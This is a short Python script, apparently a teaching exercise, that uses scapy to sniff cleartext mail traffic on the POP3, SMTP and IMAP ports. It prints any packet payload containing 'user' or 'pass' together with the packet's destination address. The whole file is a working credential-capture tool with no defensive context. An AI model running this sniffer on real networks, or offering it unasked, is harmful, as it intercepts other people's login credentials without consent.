from tracemalloc import stop
from scapy.all import sniff, TCP, IP


def packet_sniff(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Packet Destination : {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

    # print(packet.show())


def main():
    # Begin Packet Sniffing with new filter
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143 ',
          prn=packet_sniff, store=0)


if __name__ == '__main__':
    main()
